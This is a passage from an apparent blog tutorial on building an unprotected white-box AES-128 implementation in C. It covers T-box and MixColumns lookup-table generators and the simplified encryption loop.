</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">9</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">ShiftRows</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>        <span class="n">ShiftRows</span><span class="p">(</span><span class="n">round_keys</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span><span class='line'>        <span class="n">AddRoundKey</span><span class="p">(</span><span class="n">round_keys</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">out</span><span class="p">);</span>
</span><span class='line'>        <span class="n">SubBytes</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>        <span class="n">MixColumns</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// Last round which is a bit different</span>
</span><span class='line'>    <span class="n">ShiftRows</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>    <span class="n">ShiftRows</span><span class="p">(</span><span class="n">round_keys</span><span class="p">[</span><span class="mi">9</span><span class="p">]);</span>
</span><span class='line'>    <span class="n">AddRoundKey</span><span class="p">(</span><span class="n">round_keys</span><span class="p">[</span><span class="mi">9</span><span class="p">],</span> <span class="n">out</span><span class="p">);</span>
</span><span class='line'>    <span class="n">SubBytes</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>    <span class="n">AddRoundKey</span><span class="p">(</span><span class="n">round_keys</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="n">out</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Step 4: White-boxing it like it&rsquo;s hot, White-boxing it like it&rsquo;s hot</h2>

<p>This step is a really important one for us, it&rsquo;s actually the first one where we are going to be able to both remove the key &amp; start the tables generator project. The tables generator project basically generates everything we need to have our white-box AES encryption working.</p>

<p>Now we don&rsquo;t need the key schedule anymore in the AES encryption function (but obviously we will need it on the table generator side), and we can keep only the encryption loop.</p>

<p>The transformation introduced in this step is to create a look-up table that will replace <code>ShiftRows(round_keys[i])</code>/<code>AddRoundKey</code>/<code>SubBytes</code>. We can clearly see now how our round keys are going to be &ldquo;diffused&rdquo; &amp; combined with different operations to make them &ldquo;not trivially&rdquo; extractable (in fact they are, but let&rsquo;s say they are not right now). In order to have such a table, we need quite some space though: basically we need this table <code>Tboxes[10][16][0x100]</code>. We have 10 operations <code>ShiftRows(round_keys[i])</code>/<code>AddRoundKey</code>/<code>SubBytes</code>, 16 bytes of round keys in each one of them and the 0x100 for the bytes (<code>[0x00-0xFF]</code>) than can be encrypted.</p>

<p>The computation is not really hard:</p>

<ol>
<li>We compute the key schedule for a specific encryption key</li>
<li>We populate the table this way:

<ol>
<li>For each round key:</li>
<li>. For every byte possible:

<ol>
<li>You compute <code>S_box[byte ^ ShiftRows(roundkey)[i]]</code></li>
</ol>
</li>
</ol>
</li>
</ol>


<p>The <code>S_box</code> part is for the <code>SubBytes</code> operation, the xor with one byte of the round key is for <code>AddRoundKey</code> &amp; the rest is for <code>ShiftRows(round_keys[i])</code>. There is a special case for the 9th round key, where you have to include <code>AddRoundKey</code> of the latest round key. It&rsquo;s like we don&rsquo;t have 11 rounds anymore, but 10 now. As the 9th contains information about the round key 9th &amp; 10th.</p>

<p>If you are confused about that bit, don&rsquo;t be ; it&rsquo;s just I suck at explaining things, but just have a look at the following code (especially at lines 47, 48):</p>

<figure class='code'><figcaption><span>wbaes128_unprotected_tables_generator.c:Tboxes generation</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;0vercl0k@doare-e&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">plain_block</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;whatdup folks???&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">round_keys</span><span class="p">[</span><span class="mi">11</span><span class="p">][</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// 10 -&gt; we have 10 rounds</span>
</span><span class='line'>    <span class="c1">/// 16 -&gt; we have 16 bytes of round keys</span>
</span><span class='line'>    <span class="c1">/// 0x100 -&gt; we have to be able to encrypt every plain-text input byte [0-0xff]</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">Tboxes</span><span class="p">[</span><span class="mi">10</span><span class="p">][</span><span class="mi">16</span><span class="p">][</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">key_schedule</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">round_keys</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// Remember we have 10 rounds &amp; we want to combine AddRoundKey &amp; SubBytes</span>
</span><span class='line'>    <span class="c1">/// which is really simple.</span>
</span><span class='line'>    <span class="c1">/// These so-called T-boxes are defined as follows:</span>
</span><span class='line'>    <span class="c1">/// Tri(x) = S[x ^ ShiftRows(rk)[i]] ; r being the round number ([0-8]), x being the byte of plaintext, rk the roundkey &amp; i the index ([0-15])</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;#pragma once</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;// Table for key=&#39;%.16s&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;const unsigned char Tboxes[10][16][0x100] = </span><span class="se">\n</span><span class="s">{</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">r</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="o">++</span><span class="n">r</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;  {</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">ShiftRows</span><span class="p">(</span><span class="n">round_keys</span><span class="p">[</span><span class="n">r</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;    {</span><span class="se">\n</span><span class="s">      &quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span> <span class="o">++</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">x</span> <span class="o">%</span> <span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">      &quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>                <span class="n">Tboxes</span><span class="p">[</span><span class="n">r</span><span class="p">][</span><span class="n">i</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">S_box</span><span class="p">[</span><span class="n">x</span> <span class="o">^</span> <span class="n">round_keys</span><span class="p">[</span><span class="n">r</span><span class="p">][</span><span class="n">i</span><span class="p">]];</span>
</span><span class='line'>                <span class="c1">/// We need to include the bytes from the roundkey 10 to replace that:</span>
</span><span class='line'>                <span class="c1">///  ShiftRows(out);</span>
</span><span class='line'>                <span class="c1">///  ShiftRows(round_keys[9]);</span>
</span><span class='line'>                <span class="c1">///  AddRoundKey(round_keys[9], out);</span>
</span><span class='line'>                <span class="c1">///  SubBytes(out);</span>
</span><span class='line'>                <span class="c1">///  AddRoundKey(round_keys[10], out);</span>
</span><span class='line'>                <span class="c1">///</span>
</span><span class='line'>                <span class="c1">/// By</span>
</span><span class='line'>                <span class="c1">/// ShiftRows(out);</span>
</span><span class='line'>                <span class="c1">/// for (size_t j = 0; j &lt; 16; ++j)</span>
</span><span class='line'>                <span class="c1">///     out[j] = Tboxes[9][j][out[j]];</span>
</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">==</span> <span class="mi">9</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">Tboxes</span><span class="p">[</span><span class="n">r</span><span class="p">][</span><span class="n">i</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="o">^=</span> <span class="n">round_keys</span><span class="p">[</span><span class="mi">10</span><span class="p">][</span><span class="n">i</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;0x%.2x&quot;</span><span class="p">,</span> <span class="n">Tboxes</span><span class="p">[</span><span class="n">r</span><span class="p">][</span><span class="n">i</span><span class="p">][</span><span class="n">x</span><span class="p">]);</span>
</span><span class='line'>                <span class="k">if</span> <span class="p">((</span><span class="n">x</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;, &quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">    }&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;,&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;  }&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">((</span><span class="n">r</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;,&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;};</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now that we have this table created, we just need to actually use it in our encryption. Thanks to this table, the encryption loop is way more simple and pretty, check it out:</p>

<figure class='code'><figcaption><span>aes128_enc_wb_step1</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">aes128_enc_wb_step1</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">in</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">16</span><span class="p">])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">memcpy</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">in</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">9</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">ShiftRows</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">x</span> <span class="o">=</span> <span class="n">Tboxes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">][</span><span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="p">]];</span>
</span><span class='line'>            <span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">MixColumns</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">ShiftRows</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">x</span> <span class="o">=</span> <span class="n">Tboxes</span><span class="p">[</span><span class="mi">9</span><span class="p">][</span><span class="n">j</span><span class="p">][</span><span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="p">]];</span>
</span><span class='line'>        <span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Step 5: Transforming <code>MixColumns</code> in a look-up table</h2>

<p>OK, so this is maybe the &ldquo;most difficult&rdquo; part of the game: we have to transform our ugly <code>MixColumn</code> function in four look-up tables. Basically, we want to transform this:</p>

<figure class='code'><figcaption><span>before</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">out</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">0</span><span class="p">]][</span><span class="n">a</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">1</span><span class="p">]][</span><span class="n">b</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">2</span><span class="p">]][</span><span class="n">c</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">3</span><span class="p">]][</span><span class="n">d</span><span class="p">];</span>
</span><span class='line'><span class="n">out</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">4</span><span class="p">]][</span><span class="n">a</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">5</span><span class="p">]][</span><span class="n">b</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">6</span><span class="p">]][</span><span class="n">c</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">7</span><span class="p">]][</span><span class="n">d</span><span class="p">];</span>
</span><span class='line'><span class="n">out</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">8</span><span class="p">]][</span><span class="n">a</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">9</span><span class="p">]][</span><span class="n">b</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">10</span><span class="p">]][</span><span class="n">c</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">11</span><span class="p">]][</span><span class="n">d</span><span class="p">];</span>
</span><span class='line'><span class="n">out</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">12</span><span class="p">]][</span><span class="n">a</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">13</span><span class="p">]][</span><span class="n">b</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">14</span><span class="p">]][</span><span class="n">c</span><span class="p">]</span> <span class="o">^</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="mi">15</span><span class="p">]][</span><span class="n">d</span><span class="p">];</span>
</span></code></pre></td></tr></table></div></figure>


<p>by this (where <code>Ty[0-4]</code> are the look-up tables I mentioned just above):</p>

<figure class='code'><figcaption><span>after</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">DW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span><span class="p">])</span> <span class="o">=</span> <span class="n">Ty</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">a</span><span class="p">]</span> <span class="o">^</span> <span class="n">Ty</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">b</span><span class="p">]</span> <span class="o">^</span> <span class="n">Ty</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="n">c</span><span class="p">]</span> <span class="o">^</span> <span class="n">Ty</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="n">d</span><span class="p">];</span>
</span></code></pre></td></tr></table></div></figure>


<p>We know that <code>gmul[X]</code> gives you 1 byte, and we can see those four lines use <code>gmul[X][a]</code> where <code>X</code> is constant. You can also see that basically those four lines take 4 bytes as input <code>a</code>, <code>b</code>, <code>c</code> &amp; <code>d</code> and will generate 4 bytes as output.</p>

<p>The idea is to combine <code>gmul[matrix[0]][a]</code>, <code>gmul[matrix[4]][a]</code>, <code>gmul[matrix[8]][a]</code> &amp; <code>gmul[matrix[12]][a]</code> inside a single double-word. We do the same for <code>b</code>, <code>c</code> &amp; <code>d</code> so that we can directly apply the <code>xor</code> operation between double-words now ; the result will also be a double-word so we have our 4 output bytes. We just re-factorized 4 individual computations (1 byte as input, 1 byte as output) into a single one (4 bytes as input, 4 bytes as output).</p>

<p>With that in mind, the tables generation function writes nearly by itself:</p>

<figure class='code'><figcaption><span>wbaes128_unprotected_tables_generator.c:Ty tables generation</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="p">[...]</span>
</span><span class='line'>    <span class="k">typedef</span> <span class="k">union</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">b</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="n">magic_int</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// 4 -&gt; four rows MC</span>
</span><span class='line'>    <span class="c1">/// 0x100 -&gt; for every char</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">Ty</span><span class="p">[</span><span class="mi">4</span><span class="p">][</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;const unsigned int Ty[4][16][0x100] =</span><span class="se">\n</span><span class="s">{</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;  {</span><span class="se">\n</span><span class="s">    &quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">j</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">j</span> <span class="o">%</span> <span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">    &quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">magic_int</span> <span class="n">mi</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">mi</span><span class="p">.</span><span class="n">b</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">0</span><span class="p">]][</span><span class="n">j</span><span class="p">];</span>
</span><span class='line'>            <span class="n">mi</span><span class="p">.</span><span class="n">b</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]][</span><span class="n">j</span><span class="p">];</span>
</span><span class='line'>            <span class="n">mi</span><span class="p">.</span><span class="n">b</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">]][</span><span class="n">j</span><span class="p">];</span>
